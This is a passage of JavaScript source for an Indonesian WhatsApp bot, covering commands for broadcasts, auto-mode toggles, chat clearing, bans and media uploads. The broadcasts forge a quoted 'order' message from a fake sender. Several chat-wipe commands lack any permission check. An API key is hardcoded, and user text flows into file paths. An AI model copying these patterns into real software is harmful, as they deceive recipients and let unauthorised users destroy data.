					    await sendBc(_.jid, ` *BROADCAST GROUP*\n\n${q}`,`© ${fake1}`, fs.readFileSync('./stik/thumbnaildokumen.jpg'), yesnih)
						} 
						await setReply(`Sukses mengirim Broadcast:\n${q}`)
					    }
					   break
					
					case 'cuaca':
			       if (!q) return setReply('Masukan Nama Daerah')
                  await setReply('Searching...')
	              axios.get(`https://api.xteam.xyz/cuaca?kota=${q}&APIKEY=MIMINETBOT`).then ((res) => {
	 	         let hasil = `Cuaca Daerah *${q}*\n\nTempat : ${res.data.message.kota}\nAngin : ${res.data.message.angin}\nCuaca : ${res.data.message.cuaca}\nDeskripsi : ${res.data.message.deskripsi}\nKelembapan : ${res.data.message.kelembapan}\nSuhu : ${res.data.message.suhu}\nUdara : ${res.data.message.pressure}`
                  setReply(hasil)
	              })
	             break
					
					case 'pcallmember':
					case 'pcallmem':
					case 'bcmember':
					if(!isGroup) return setReply("Fitur hanya bisa di gunakan di dalam group")
					if (!isOwner && !dev.key.fromMe) return onlyOwner()
					if (args.length < 1) return setReply('Teksnya?')
					await setReply(`*Loading...*`)
					anus = await groupMembers
					let ayey = [{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
                    {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
					if (isMedia && !dev.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							xdev.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							xdev.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							xdev.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
					} else {
						for (let _ of anus) {
							await sendBc(_.jid, `*BROADCAST PRIVATE*\n\n${q}`,`© ${fake1}`, fs.readFileSync('./stik/thumbnaildokumen.jpg'), ayey)
						}
						sendMess(`Sukses mengirim Broadcast:\n${q}`)
					}
					break
           
           
           
           
           
           
           case 'sendhidetag':        
	        if (args.length < 1) return setReply(`Penggunaan ${prefix}sendhidetag idgc|teks\nUntuk mendapatkan id gc ketik ${prefix}getidgc di group`)
	        if(!q.includes("|")) return setReply(`Penggunaan ${prefix}sendhidetag idgc|teks\nUntuk mendapatkan id gc ketik ${prefix}getidgc di group`)
		    if (args[0].startsWith('08')) return setReply('Maukin idgc goblok')
            if (args[0].startsWith('+62')) return setReply('masukin idgc peak lu')
		    var gc = body.slice(13)
            var idgc = gc.split("|")[0];
            var teks = gc.split("|")[1];
			var group = await xdev.groupMetadata(idgc)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: teks,
			contextInfo: { mentionedJid: mem },
			quoted: dev
			}
			await xdev.sendMessage(idgc, optionshidetag, text)
			await setReply(`Sukses mengirim hidetag`)
			break
			
			
			
			
			case 'autowelcome':
		            if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autoWelcome === true) return setReply('Udah aktif kak')
                    autoWelcome = true           
                    let ih =`Mode auto welcome telah aktif kak`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autoWelcome === false) return setReply('Udah off kak')
                     autoWelcome = false         
                     let eh =`Mode auto welcome telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTO WELCOME`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autowelcome on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autowelcome off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
			
			
			
           
           
           case 'autoread':
		            if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autoread === true) return setReply('Udah aktif kak')
                    autoread = true
                    
                    let ih =`Mode auto read telah aktif kak \nBot akan auto read saat di chat`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autoread === false) return setReply('Udah off kak')
                     autoread = false
                    
                     let eh =`Mode auto read telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTOREAD`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autoread on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autoread off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 
                 
                 
                 
                 
                 
                 
                 
                 
            case 'autoclearchat':
            case 'autoclearall':
            if (!isOwner) return onlyOwner()
			if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
			if (AutoClearChat) return setReply('Udah aktif kak')
            AutoClearChat = true
            setReply("Sukses Activated auto clear all, semua pesan akan di hapus sehari sekali")
            } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
        	if (!AutoClearChat) return setReply('Udah off kak')
            AutoClearChat = false
            setReply("Sukses Deactivated auto clear chat")
            }
            break
     
     
     case 'autoreport':
            if (!isOwner) return onlyOwner()
			if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
			if (autoReport) return setReply('Udah aktif kak')
            autoReport = true
            setReply("Sukses activated auto report")
            } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
        	if (!autoReport) return setReply('Udah off kak')
            autoReport = false
            setReply("Sukses deactibated auto auto report")
            }
            break
     
                 
                 
                 case 'autorespon':
			       if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autorespon === true) return setReply('Udah aktif kak')
                    autorespon = true
                    let ih =`Mode auto respon telah aktif kak \nBot akan auto respon saat di chat`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autorespon === false) return setReply('Udah off kak')
                     autorespon = false
                     let eh =`Mode auto respon telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTOREAD`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autorespon on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autorespon off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 
                 
                 
                 
                 
                 
                 
                 
					
					
					case 'autovn':
		            if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable') {
					if (autovn === true) return setReply('Udah aktif kak')
                    autovn = true
                    typing = false
                    autosticker = false
                    let ih =`Mode auto vn telah aktif kak \nBot akan auto voice saat di kasih perintah`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autovn === false) return setReply('Udah off kak')
                     autovn = false
                     let eh =`Mode auto vn telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTO VOICE NOTE`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autovn on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autovn off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 case 'autosticker':
				    if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autosticker === true) return setReply('Udah aktif kak')
                    autosticker = true
                    autovn = false
                    typing = false
                    let ih =`Mode autosticker telah aktif kak`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autosticker === false) return setReply('Udah off kak')
                     autosticker = false
                     let eh =`Mode autosticker telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTOSTICKER`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autosticker on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autosticker off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
					
                 case 'autotyping':
					case 'typing':
					if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (typing === true) return setReply('Udah aktif kak')
                    typing = true
                    autovn = false
                    autosticker = false
                    let ah =`Mode typing telah aktif kak \nBot akan auto typing saat di beri perintah`
                    xdev.sendMessage(from, ah, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (typing === false) return setReply('Udah off kak')
                     typing = false
                     let uh =`Mode typing telah di matikan`
                     xdev.sendMessage(from, uh, text, { quoted: setQuoted, contextInfo: forward})
					} else if (!q) {
                      sendButMessage(from, `MODE AUTO TYPING`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autotyping on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autotyping off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 
                 
                 
                 
                 
                 
                 
                 case 'autoblockcmd':
		            if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable') {
					if (autoblockcmd === true) return setReply('Udah aktif kak')
                    autoblockcmd = true          
                    let ih =`Mode auto block command telah aktif kak \nBot akan auto block saat ada command yang error`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autoblockcmd === false) return setReply('Udah off kak')
                     autoblockcmd = false
                     let eh =`Mode auto block command telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTO BLOCK CMD`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autoblockcmd on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autoblockcmd off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 case 'autobio':
			       if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autobio) return setReply('Udah aktif kak')
                    autobio = true          
                    let ih =`Mode auto bio telah aktif kak`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (!autobio) return setReply('Udah off kak')
                     autobio = false
                     let eh =`Mode auto bio telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTO BIO`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autobio on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autobio off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 
                 
           
      case 'unblockcmd':
      case 'delblock':
      case 'delblockcmd':
      try{
    	  if (!isOwner) return onlyOwner()
          if(!q) return setReply("Textnya mana cih")
          if (!checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut tidak ada di database`)
          deleteblockcmd(q, listcmdblock)        
          setReply(`Berhasil unblock command 「 *${q}* 」`)
          } catch (err) {
          	setReply("Bjirr error, keknya ada yang error")
          }
      break  
            
case 'blockcmd':
if (!isOwner) return onlyOwner()
if(!q) return setReply(`Textnya mana cih\n\nContoh : ${prefix}blockcmd menu\nGituuuuuuu`)
if (checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut sudah ada di database`)
addblockcmd(q,listcmdblock)         
setReply(`Berhasil memblokir command 「 *${q}* 」\nsilakan ketik ${prefix}listblockcmd untuk melihat\ndaftar command yang telah di block`)          
break
            
            
            
            
                  
           case 'listblockcmd':
           case 'listcmdblock':
let wo = `*「 LIST BLOCK CMD 」*`
let soso = [];
for (let i of listcmdblock) {
soso.push(i.cmd)
wo += `\n\n•> Command : ${i.cmd}`
}
mentions(wo, soso, true)
break
            
case 'clearall1':
try{
					if (!isOwner) return onlyOwner()
					let chiit = await xdev.chats.all()
					await xdev.setMaxListeners(25)
                    for (let _ of chiit){
                   // xdev.modifyChat(i.jid, ChatModification.delete)       
          await xdev.modifyChat(_.jid, 'clear', { includeStarred: false })
                    }
                   // await setReply("Sukses Clear All Chat")
                    } catch (err){
                	setReply(`${err}`)
                    }
					break

case 'clearall':{
let chats = xdev.chats.all().map(chat => chat.jid)
for (let id of chats) {
await xdev.modifyChat(id, 'delete').catch(console.log)
 }
 setReply(`Sukses delete All chat `)
 }
break


case 'readall':
if (!isOwner) return onlyOwner()
let readall = await xdev.chats.all()
for (let i of readall){
await xdev.chatRead(i.jid, "read")
}
setReply(`Berhasil membaca ${readall.length} pesan`)
break


case 'clearallgc':
try{ 
var clearpc = await xdev.chats.array.filter(v => v.jid.endsWith('g.us'))
clearpc.map( async ({ jid }) => {
 await xdev.modifyChat(jid, ChatModification.delete).catch(console.log)          
})
await setReply(`Succes Clear All ${clearpc.length} Group Chat`)
} catch (err){
setReply(`${err}`)
}
break
	
	
	
case 'clearallpc':
try{ 
var cleargc = await xdev.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
cleargc.map( async ({ jid }) => {
await xdev.modifyChat(jid, ChatModification.delete)                
})
//await setReply(`Succes Clear All ${cleargc.length} Private Chat`)
} catch (err){
setReply(`${err}`)
}
break



           
                    
case 'delallerror':
case 'clearallerror':
				         if (!isOwner) return onlyOwner()
				         var obj = [] 
                         fs.writeFileSync('./database/listerror.json', JSON.stringify(obj))         
				         await setReply(`ALL ERROR BERHASIL DI HAPUS`)
			             break 
	
	case 'delalluser':
	case 'clearalluser':
				         if (!isOwner) return onlyOwner()
				         var obj = [] 
                         fs.writeFileSync('./database/user.json', JSON.stringify(obj))         
				         await setReply(`ALL USER BERHASIL DI HAPUS`)
			             break 
			
			
			case 'delallblock':
	case 'clearallblock':
				         if (!isOwner) return onlyOwner()
				         var obj = [] 
                         fs.writeFileSync('./database/userblocked.json', JSON.stringify(obj))         
				         await setReply(`ALL BLOCK BERHASIL DI HAPUS`)
			             break 

			
			
			
			case 'delallban':
	case 'clearallban':
	case 'clearallbanned':
				         if (!isOwner) return onlyOwner()
				
				setReply("Suksek clear all ban")
				clearAllBan(ban)
			             break 
			
case 'clearalldb':
if (!isOwner) return onlyOwner()
clearAllDb(Dashboard)
setReply("Suksek clear all dashboard")
break
			
			            
           
           case 'public':
               if (!isOwner) return onlyOwner()

           if (publik === true) return setReply('Udah di mode publick kak')
           publik = true
           let bab =`Mode public aktif kak`
           xdev.sendMessage(from, bab, text, { quoted: setQuoted, contextInfo: forward})
           break
           
case 'self':
                 if (!isOwner) return onlyOwner()

           if (publik === false) return setReply('Udah di mode self kak')
           publik = false
           let breh =`Mode self aktif kak`
           xdev.sendMessage(from, breh, text, { quoted: setQuoted, contextInfo: forward})
           break
           
           
            
           
           
           case 'setppbot':
					if (!isOwner) return onlyOwner() 
					if (!isQuotedImage) return setReply(`Kirim gambar dengan caption ${prefix}setbotpp atau tag gambar yang sudah dikirim`)
					if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return setReply('Reply gambarnya aja om')
					enmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await xdev.downloadAndSaveMediaMessage(enmedia)
					await xdev.updateProfilePicture(botNumber, media)
					await setReply('Makasih profil barunya😗')
					fs.unlinkSync(media)
					break
           
           
           
           
           case 'setprefix':
           case 'setpref':
                     if (!isOwner) return onlyOwner()
teks =`SETTING PREFIX\n\nSilakan masukkan prefix\nOptions :\n=> multi\n=> nopref\n=> allpref`
                if (c === 'multi'){
                    multi = true
                    nopref = false
                    setReply(`Berhasil mengubah prefix ke *「 ${c} 」*`)
                } else if (c === 'nopref'){
                	multi = false
                    nopref = true
                    setReply(`Berhasil mengubah prefix ke *「 ${c} 」*`)
                } else if (c === 'allpref'){
                	multi = false
                    nopref = false
                    allpref = true
                    setReply(`Berhasil mengubah prefix ke *「 ${c} 」*`)
                } else {
                    multi = false
                    nopref = false
                    prefa = `${c}`
                    setReply(`Berhasil mengubah prefix ke *「 ${c} 」*`)
                } if (!q) {
sendButMessage(from, teks, [
{buttonId: `${prefix}setreply web`, buttonText: {displayText: `ᴡᴇʙ`},type: 1},
{buttonId: `${prefix}setreply troli`, buttonText: {displayText: `ᴛʀᴏʟɪ`},type: 1},
{buttonId: `${prefix}setreply mess`, buttonText: { displayText: `ᴍᴇss`},type: 1}]);
 } 
                break
                
           
           case 'addrespon':{
         if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
          if (args.length < 1) return setReply(`Penggunaan ${prefix}addrespon key|respon\n\nContoh : ${prefix}addrespon hai|juga`)
          let input1 = body.slice(11)
          if (!input1.includes('|')) return setReply(`Penggunaan ${prefix}addrespon key|respon\n\nContoh : ${prefix}addrespon hai|juga`)
          let input = input1.split("|")
          if (checkCommands(input[0], commandsDB) === true) return setReply(`Command tersebut sudah ada`)
          addCommands(input[0], input[1], sender, commandsDB) 
          setReply(`Key : ${input[0]}\nRespon : ${input[1]}\n\nRespon berhasil di set`)
          }
      break
      
      case 'dellrespon':
      case 'delrespon':{
          if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
            if (args.length < 1) return setReply(`Penggunaan ${prefix}delrespon key\n\nContoh : ${prefix}delrespon hai`)
          if (!checkCommands(q, commandsDB)) return setReply(`Key tersebut tidak ada di database`)
          deleteCommands(q, commandsDB)
          setReply(`Berhasil menghapus respon dengan key ${q}`)
          }
      break
      
      
      
      
  
      
      
           
		case 'ban':
		case 'banned':
		    if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
			if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return setReply('Reply atau tag targetnya')
			          
		    mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
		    if (mentioned.length > 1) return reply ('Satu satu dong wuuuuuuuuuuu')
            if (mentioned.length < 1) {
            asu = dev.message.extendedTextMessage.contextInfo.participant
           nama = xdev.contacts[asu] != undefined ? xdev.contacts[asu].notify = undefined ? PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international') : xdev.contacts[asu].notify || xdev.contacts[asu].vname : PhoneNumber('+' + asu.replace('@s.whatsapp.net', '')).getNumber('international')
            Nomer =`${asu.split("@")[0]}@s.whatsapp.net`
            if(cekBannedUser (asu, ban)) return setReply("Udah di ban kak")
            if(Nomer === ownerNumber[0]) return setReply("Ga mau")
            addBanned(nama,calender,  Nomer, ban)               
            setReply( `*Asik si beban* @${asu.split("@")[0]} *kena banned* 🤣`);
            } else {
       	 if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
            if (mentioned.includes(ownerNumber[0])) return setReply(`Tidak bisa banned Owner`)
            if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return setReply(`Tidak bisa banned owner group`)
            nama = xdev.contacts[mentioned] != undefined ? xdev.contacts[mentioned].notify = undefined ? PhoneNumber('+' + mentioned.replace('@s.whatsapp.net', '')).getNumber('international') : xdev.contacts[mentioned].notify || xdev.contacts[mentioned].vname : PhoneNumber('+' + mentioned.replace('@s.whatsapp.net', '')).getNumber('international')
            ahah = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
            if(cekBannedUser (ahah, ban)) return setReply("Udah di ban kak")     
            addBanned(nama, calender, ahah, ban)  
            setReply(`Asik si wawan @${mentioned[0].split('@')[0]} kena banned 🤣`);
            }
            break
                  
    
    
			case 'listban':
			case 'banlist':
		//     if (!isOwner) return onlyOwner()
	          banya = `*List Banned*\nJumlah : ${JSON.parse(fs.readFileSync('./database/banned.json')).length}\n\n`
			JSON.parse(fs.readFileSync('./database/banned.json')).map(function(e, i){
			
            banya += (i+1)+`.🆔 Nama : ${e.name}\n    📲 Nomer : wa.me/${e.id.split("@")[0]}\n    📅 Tanggal : ${e.date}\n\n`            
        });
				setReply(banya)
				break
            
            
            
            
            
			


           
           
           
           
     
	case 'setfakeimg':
    if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
        	if ((isMedia && !dev.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
			delb = await xdev.downloadMediaMessage(boij)
			fs.writeFileSync(`./stik/fake.jpeg`, delb)
			setReply(`Berhasil mengubah fake image`)
        	} else {
            setReply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
			
case 'setimagedoc':
case 'setimgdoc':
    if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
        	if ((isMedia && !dev.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
			delb = await xdev.downloadMediaMessage(boij)
			fs.writeFileSync(`./stik/thumbnaildokumen.jpg`, delb)
			setReply(`Berhasil mengubah dokumen image`)
        	} else {
            setReply(`Kirim gambar dengan caption ${prefix}setimagedoc`)
          	}
			break	
			
case 'rotate':{
if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
if (!isQuotedImage) return setReply(`Kirim gambar dengan caption ${prefix+command}`);
boij = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
delb = await xdev.downloadMediaMessage(boij);
input =  getRandom('.jpg')
output =  getRandom('.jpg') 
fs.writeFileSync(`./${input}`, delb);         
let image = await Jimp.read(`./${input}`)
   // Checking if any error occurs while rotating image
await image.rotate(450, function(err){
    if (err) return setReply(err)
   })
   .write(`./${output}`)
await xdev.sendMessage(from, fs.readFileSync(`./${output}`), image, {quoted: dev, caption: "Nih"})
await fs.unlinkSync(`./${output}`)
await fs.unlinkSync(`./${input}`)
}
break
			
			
		

			
			
			
			
		case 'setthumb':
        if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
          delb = await xdev.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/thumb.jpeg`, delb);
          setReply(`Berhasil mengubah thumbnail`)
        } else {
          setReply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;
			
           
case 'setovo':
        if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
          delb = await xdev.downloadMediaMessage(boij);
          fs.writeFileSync(`./kode qr/ovo.jpg`, delb);
          setReply(`Berhasil mengubah kode qr ovo`)
        } else if(q){
          setReply(`Kirim gambar dengan caption ${prefix}setovo`);
        }
        break;
        
        
        case 'setgopay':
        if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
          delb = await xdev.downloadMediaMessage(boij);
          fs.writeFileSync(`./kode qr/gopay.jpg`, delb);
          setReply(`Berhasil mengubah kode qr gopay`)
       } else if(q){
          setReply(`Kirim gambar dengan caption ${prefix}setgopay`);
        }
        break;
           
           
       case 'setdana':
        if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
          delb = await xdev.downloadMediaMessage(boij);
          fs.writeFileSync(`./kode qr/dana.jpg`, delb);
          setReply(`Berhasil mengubah kode qr dana`)
        } else if(q){
          setReply(`Kirim gambar dengan caption ${prefix}setdana`);
        }
        break;
        
        
        case 'setimagereply':
        case 'setimgreply':
        if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
          delb = await xdev.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/reply.jpg`, delb);
          setReply(`Berhasil mengubah image reply`)
        } else {
          setReply(`Kirim gambar dengan caption ${prefix}setimagereply`);
        }
        break;
        
        
        case 'setimageinfo':
        case 'setimgenfo':
        if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
          delb = await xdev.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/bot.jpg`, delb);
          setReply(`Berhasil mengubah image pada infobotz`)
        } else {
          setReply(`Kirim gambar dengan caption ${prefix}setimageinfo`);
        }
        break;
        
        
           
           
     case 'addstik':
		if (!dev.key.fromMe && !isOwner) return reply (mess.only.ownerB)
				if (!isQuotedSticker) return setReply('Reply stiker nya')
				
				if (!q) return setReply('Nama sticker nya apa?')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await xdev.downloadMediaMessage(boij)
				setiker.push(`${q}`)
				fs.writeFileSync(`./temp/stick/${q}.webp`, delb)
				fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
				xdev.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`, MessageType.text, { quoted: dev})
				break
				
					case 'dellstik':
					case 'delstik':
					if(!dev.key.fromMe & !isOwner) return setReply('Only owner')
					if (!q) return setReply(mess.wrongFormat)
					try {
						wanu = imagenye.indexOf(q)
						setiker.splice(wanu,1)
						fs.unlinkSync(`./temp/stick/${q}.webp`)
						fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
						setReply(`Succes delete sticker ${q}!`)
					} catch (err) {
						setReply(`Gagal delete sticker ${q}!`)
					}
					break
			
				
				
				
				
				
				
				
				case 'addvn':
				if (!dev.key.fromMe && !isOwner) return reply (mess.only.ownerB)
				if (!isQuotedAudio) return setReply('Reply vnnya')
				if (!q) return setReply('Nama audionya apa')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await xdev.downloadMediaMessage(boij)
				audionye.push(q)
				fs.writeFileSync(`./temp/audio/${q}.mp3`, delb)
